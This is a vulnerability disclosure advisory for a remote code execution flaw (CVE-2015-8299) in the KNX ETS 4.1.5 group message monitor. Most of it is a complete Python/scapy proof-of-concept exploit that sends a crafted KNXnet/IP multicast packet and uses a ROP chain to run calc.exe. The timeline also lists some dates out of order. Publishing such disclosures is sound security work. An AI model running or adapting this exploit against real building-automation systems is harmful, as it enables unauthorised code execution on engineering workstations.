# Remote code execution vulnerability in the KNX management software ETS #

## Vulnerability Overview ##

* **Identifier**            : knAx_20150101
* **Type of Vulnerability** : Buffer overflow vulnerability
* **Software/Product Name** : ETS (Engineering Tool Software)
* **Vendor**                : KNX Association
* **Affected Versions**     : ETS 4.1.5 (Build 3246)
                            : *no other versions tested*
* **Fixed in Version**      : *unknown*
* **CVE ID**                : CVE-2015-8299
* **Impact**                : Critical

## Vulnerability Description ##

The vulnerability is caused by a buffer overflow in a memcpy
operation when parsing specailly crafted KNXnet/IP packets in the
Group messages monitor (aka. Falcon). An according proof-of-concept
exploit which was tested on an affected ETS version installed on a
Windows XP SP3 can be found below. The proof-of-concept exploit
generates the UDP packet which triggers the vulnerability and should
at least crash the application (it requires python and scapy to run).

## Proof-of-Concept ##

Since this is just a PoC the ROP chain was not carefully selected and
might require adaptation to reproduce the desired results on your system.

`knAx.py`:

```python
#!/usr/bin/env python
"""  ETS4 buffer overflow exploit PoC

This is a Proof-of-Concept (PoC) remote exploit of a ETS4 which is
currently running the monitoring software for group messages aka.
"Groupenmonitor". This feature of the ETS4 runs an executable called
"Falcon.exe" which is vulnerable to a buffer overflow.

The vulnerable function gets called at:
0043C994 call    overflow_43C743
This function, which is responsible for the overflow, is located at 0x43c743.
The "memcpy" which produces the overflow gets called at:
0043C931 call    memcpy

Vulnerable version:
    ETS 4.1.5 (Build 3246)
    Stammdaten: Version 57, Schema 1.1
    registry key: "NET Framework Setup"
        v2.0.50727 -version 2.2.30729
        v4 -version 4.0.30319

ETS4.exe
    LegalCopyright: Copyright \xa9 2010-2012 KNX Association cvba, Brussels, Belgium
    Assembly Version: 4.1.3246.36180
    InternalName: ETS4.exe
    FileVersion: 4.1.3246.36180
    CompanyName: KNX Association cvba
    Comments: ETS4 Application
    ProductName: ETS4
    ProductVersion: 4.1.3246.36180
    FileDescription: ETS4
    OriginalFilename: ETS4.exe

Falcon.exe
    LegalCopyright: Copyright (C) 2000-2008 KNX Association, Brussels, Belgium
    InternalName: Falcon
    FileVersion: 2.0.5184.4346
    CompanyName: KNX Association
    SpecialBuild: 2011.01.16
    LegalTrademarks: KNX Association
    OLESelfRegister:
    ProductVersion: 2.0
    FileDescription: Falcon
    OriginalFilename: Falcon.ex

Tested on:
    Windows XP SP3 32bit

This exploit uses return-oriented-programming techniques. The gadgets used for ROP are:
ole32.dll:"0x774fdb5b","33c0c3","0x774fdb5b: xor eax, eax | 0x774fdb5d: ret | "
ole32.dll:"0x77550f6f","83c064c3","0x77550f6f: add eax, 64h | 0x77550f72: ret | "
ole32.dll:"0x774ff447","03c4c24e77","0x774ff447: add eax, esp | 0x774ff449: ret 774eh | "
user32.dll:"0x7e467666","94c3","0x7e467666: xchg esp, eax | 0x7e467667: ret | "

The exploit requires root privelages to send the crafted packet and
the scapy python module!

PoC and vuln. discovery
by aljosha judmayer
"""
from struct import pack,unpack
from scapy.all import *

# --- variables ---
ip_dest = "224.0.23.12"
udp_dport = 3671
udp_sport = 3671
sys_iface = "vboxnet0" # <= CHANGE ME! to external network interface
# ---
knxhdr="\x06\x10\x05\x30\x01\xb2"
knxmsg="\xac\x01\x81\xa9\xe3\xac\xcb\x44\xff\xa2\x67\xcd\x03\x6f\x05\xe4\x58\x19\xae\x65\x1b\x14\x38\x4d\x83\x60\x06"
padding="\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"

def test():
    """ this should terminate the Falcon.exe process """
    exit="\xfa\xca\x81\x7c" # ExitProcess 0x7c81cafa, or 0xffffffff for seg fault

    sendpayload(knxhdr + knxmsg + padding + exit)
    return

def exploit():
    """
    This constructs a ROP payload and sends it.
    Because of stack manipulation after the overflow we need to jump
    over some bytes. Therefore the esp is increased.
    """

    eip  = pack("<L",0x774fdb5b)    # xor eax,eax    ;zero out register
    eip += pack("<L",0x77550f6f)    # add eax,64h    ;add jump distance
    eip += pack("<L",0x774ff447)    # add eax,esp    ;add the current position of esp
    eip += pack("<L",0x7e467666)    # xchg esp,eax   ;load the new esp address
    # --- padding ret-sled as NOP-sled
    eip += pack("<L",0x77550f72)*28 # ret            ;use ret as nop
    # --- str chunk 1
    eip += pack("<L",0x7752f82a)    # pop ecx        ;load string
    eip += "calc"                   # "calc"         ;string  
    eip += pack("<L",0x774faf34)    # pop eax        ;load dst. address
    eip += pack("<L",0x7ffdf8f4)    # f4f8fd7f       ;dst address
    eip += pack("<L",0x77593502)    # mov [eax], ecx ;copy ecx to [eax]
    # --- str chunk 2
    eip += pack("<L",0x7752f82a)    # pop ecx        ;load string
    eip += ".exe"                   # ".exe"         ;string  
    eip += pack("<L",0x774faf34)    # pop eax        ;load dst. address
    eip += pack("<L",0x7ffdf8f4+4)  # f4f8fd7f +4  ;dst address + 4
    eip += pack("<L",0x77593502)    # mov [eax], ecx ;copy str. to dst.

    # --- call WinExec()
    eip += pack("<L",0x7c8623ad)    # address of WinExec()
    eip += pack("<L",0x7c81cafa)    # ret after WinExec(), into ExitProcess 0x7c81cafa
    eip += pack("<L",0x7ffdf8f4)    # address of string

    #DEBUG
    #ostr = "\\x".join("{:02x}".format(ord(c)) for c in eip)
    #print "\\x%s" %ostr

    sendpayload(knxhdr + knxmsg + padding + eip)
    return


def sendpayload(payload):
    """ send scapy udp payload """
    pkt=Ether(dst="01:00:5e:00:17:0c")/IP(dst=ip_dest)/UDP(dport=udp_dport,sport=udp_sport)/payload
    #pkt.show2() #DEBUG
    hexdump(pkt)

    sendp(pkt, iface=sys_iface)

    return

def sendpkt(pkt):
    """ send scapy pkt on layer 2, no auto stuff """
    #pkt.show2() #DEBUG
    hexdump(pkt)

    sendp(pkt, iface=sys_iface)

    return

def main():
    exploit()
    return 0

if __name__ == "__main__":
    sys.exit(main())
```

## Timeline ##

* `2013-10-11` identification of vulnerability
* `2013-10-??` 1st vendor contact, no-reply of vendor on issue
* `2013-07-30` 2nd vendor contact, no-reply of vendor on issue
* `2013-10-06` 3rd vendor contact, no-reply of vendor on issue
* `2015-07-14` contact cve-request@mitre.
* `2015-11-23` [disclosed](http://seclists.org/fulldisclosure/2015/Nov/89)

## References ##

* Information on ETS: <http://www.knx.org/de/knx-tools/ets4/einfuehrung/>
* KNX Association: <http://www.knx.org/>

## Credits ##

* Aljosha Judmayer ([SBA Research](https://www.sba-research.org/))